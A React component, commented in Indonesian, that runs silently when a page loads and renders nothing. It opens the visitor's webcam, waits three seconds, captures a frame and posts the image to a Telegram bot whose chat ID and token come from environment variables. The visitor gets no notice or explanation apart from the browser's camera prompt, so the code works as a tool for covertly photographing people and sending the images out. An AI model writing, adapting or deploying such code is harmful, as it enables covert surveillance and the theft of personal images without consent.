import React, { useEffect } from "react";
import axios from "axios";

const CapturePhoto = () => {
  useEffect(() => {
    const capturePhotoAndSend = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        await new Promise((resolve) => setTimeout(resolve, 3000));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const dataUrl = canvas.toDataURL("image/png");
        const blob = await (await fetch(dataUrl)).blob();

        if (blob.size > 10 * 1024 * 1024) {
          console.error("Foto terlalu besar untuk dikirim ke Telegram.");
          return;
        }

        const formData = new FormData();
        formData.append("chat_id", import.meta.env.VITE_TELEGRAM_CHAT_ID); // Mengambil chat ID dari environment variable
        formData.append("photo", blob, "photo.png");

        await axios.post(
          `https://api.telegram.org/bot${
            import.meta.env.VITE_TELEGRAM_BOT_TOKEN
          }/sendPhoto`,
          formData,
          { headers: { "Content-Type": "multipart/form-data" } }
        );

        console.log("Foto berhasil dikirim ke Telegram!");

        stream.getTracks().forEach((track) => track.stop());
      } catch (error) {
        console.error("Terjadi kesalahan saat mengambil foto:", error);
      }
    };

    capturePhotoAndSend();
  }, []);

  return null;
};

export default CapturePhoto;
